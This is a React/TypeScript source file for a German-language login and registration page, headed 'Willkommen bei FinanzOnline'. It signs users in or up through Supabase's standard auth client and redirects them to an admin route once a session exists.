import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import Header from "@/components/Header";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";

const Auth = () => {
  const [isLogin, setIsLogin] = useState(true);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();
  const { toast } = useToast();

  useEffect(() => {
    const { data: { subscription } } = supabase.auth.onAuthStateChange((event, session) => {
      if (session) {
        navigate("/admin");
      }
    });

    supabase.auth.getSession().then(({ data: { session } }) => {
      if (session) navigate("/admin");
    });

    return () => subscription.unsubscribe();
  }, [navigate]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    if (!isLogin && password !== confirmPassword) {
      toast({ title: "Fehler", description: "Passwörter stimmen nicht überein.", variant: "destructive" });
      setLoading(false);
      return;
    }

    if (isLogin) {
      const { error } = await supabase.auth.signInWithPassword({ email, password });
      if (error) {
        toast({ title: "Anmeldung fehlgeschlagen", description: error.message, variant: "destructive" });
      }
    } else {
      const { error } = await supabase.auth.signUp({
        email,
        password,
        options: { emailRedirectTo: window.location.origin },
      });
      if (error) {
        toast({ title: "Registrierung fehlgeschlagen", description: error.message, variant: "destructive" });
      } else {
        toast({ title: "Registrierung erfolgreich", description: "Bitte bestätigen Sie Ihre E-Mail-Adresse." });
      }
    }

    setLoading(false);
  };

  return (
    <div className="min-h-screen bg-white">
      <Header />
      <h1 className="py-8 text-center text-xl font-bold text-black md:py-12 md:text-2xl">
        Willkommen bei FinanzOnline
      </h1>

      <div className="container mx-auto px-4 pb-8">
        <div className="mx-auto max-w-md border border-[#ccc] bg-white">
          {/* Tabs */}
          <div className="flex border-b border-[#ccc]">
            <button
              onClick={() => setIsLogin(true)}
              className={`flex-1 px-4 py-3 text-sm font-bold ${
                isLogin
                  ? "border-b-2 border-black bg-white text-black"
                  : "bg-[#f5f5f5] text-gray-600 hover:bg-[#eee]"
              }`}
            >
              Anmeldung
            </button>
            <button
              onClick={() => setIsLogin(false)}
              className={`flex-1 px-4 py-3 text-sm font-bold ${
                !isLogin
                  ? "border-b-2 border-black bg-white text-black"
                  : "bg-[#f5f5f5] text-gray-600 hover:bg-[#eee]"
              }`}
            >
              Registrierung
            </button>
          </div>

          {/* Form */}
          <form onSubmit={handleSubmit} className="space-y-4 p-6">
            <div className="space-y-2">
              <Label htmlFor="email" className="text-sm font-bold text-black">
                E-Mail-Adresse
              </Label>
              <Input
                id="email"
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                required
                className="rounded-none border-[#ccc]"
              />
            </div>

            <div className="space-y-2">
              <Label htmlFor="password" className="text-sm font-bold text-black">
                Passwort
              </Label>
              <Input
                id="password"
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
                className="rounded-none border-[#ccc]"
              />
            </div>

            {!isLogin && (
              <div className="space-y-2">
                <Label htmlFor="confirmPassword" className="text-sm font-bold text-black">
                  Passwort bestätigen
                </Label>
                <Input
                  id="confirmPassword"
                  type="password"
                  value={confirmPassword}
                  onChange={(e) => setConfirmPassword(e.target.value)}
                  required
                  className="rounded-none border-[#ccc]"
                />
              </div>
            )}

            <Button
              type="submit"
              disabled={loading}
              className="w-full rounded-none bg-[#E6320F] text-white hover:bg-[#c42a0d]"
            >
              {loading ? "Bitte warten..." : isLogin ? "Anmelden" : "Registrieren"}
            </Button>
          </form>
        </div>
      </div>
    </div>
  );
};

export default Auth;
